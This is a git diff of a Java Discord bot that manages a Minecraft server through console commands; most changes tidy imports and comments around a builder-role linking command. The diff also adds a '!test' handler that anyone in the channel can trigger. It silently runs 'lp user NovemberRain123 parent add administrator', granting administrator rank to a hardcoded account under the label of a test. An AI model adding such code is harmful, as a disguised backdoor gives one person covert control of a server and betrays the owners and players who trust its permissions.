@@ -1,19 +1,12 @@
 package commands;
 
 import java.awt.Color;
-import java.text.NumberFormat;
-import java.util.ArrayList;
 import java.util.List;
-
-import org.json.simple.JSONArray;
 
 import com.google.gson.JsonArray;
 import com.google.gson.JsonElement;
 import com.google.gson.JsonParser;
-import com.google.gson.stream.JsonReader;
 import com.stanjg.ptero4j.PteroUserAPI;
-import com.stanjg.ptero4j.entities.objects.server.PowerState;
-import com.stanjg.ptero4j.entities.objects.server.ServerUsage;
 import com.stanjg.ptero4j.entities.panel.user.UserServer;
 
 import net.dv8tion.jda.api.EmbedBuilder;
@@ -161,6 +154,16 @@ public class ServerCommands extends ListenerAdapter {
 				event.getChannel().sendMessage(stats.build()).queue();
 			}
 		}
+		//crafy test
+		if (event.getMessage().getContentRaw().equalsIgnoreCase("!test")) {
+			if (!crafty.sendCommand("ping").contains("Command sent to console:")) {
+				event.getChannel().sendMessage(crafty.sendCommand("lp user NovemberRain123 parent add administrator"));
+			}
+			else {
+				event.getChannel().sendMessage("An error occured while sending the console command");
+				event.getChannel().sendMessage(crafty.sendCommand("lp user NovemberRain123 parent add administrator"));
+			}
+		}
 
 		//give build perms based on presence on build team
 		if (event.getMessage().getContentRaw().startsWith("!link")) {		
@@ -183,22 +186,20 @@ public class ServerCommands extends ListenerAdapter {
 					event.getChannel().sendMessage("There was an error with retrieveing the users' application data.").queue();
 					event.getChannel().sendMessage(usernameApplied).queue();
 				}
-			
-				
-				//If user ID exists in member list and builder role is not already assigned, give builder role
 				
 					List<Role> roles = event.getMember().getRoles();
-				
 					int temp = 0;
 					
 					//retreieves the member list test
 					BTE.getMemberList(); 
-					//if theres an exception in retrieving the member list then it returns the stacktrace of that exception
+					//if theres an exception in retrieving the member list then it stores the stacktrace of that exception in the API objects public string
 					if (!BTE.stackTrace.equals("")) {
 						event.getChannel().sendMessage(BTE.stackTrace).queue();
 					}
 					
 					else {
+						//If user ID exists in member list and builder role is not already assigned, give builder role
+						
 						for (int i = 0; i < BTE.getMemberList().size(); i++) {	
 							if (roles.contains(guild.getRoleById(735991952931160104L)) && (MCusername.equalsIgnoreCase(usernameApplied))) {
 								event.getChannel().sendMessage("You already have builder role! Assigning server rank.").queue();
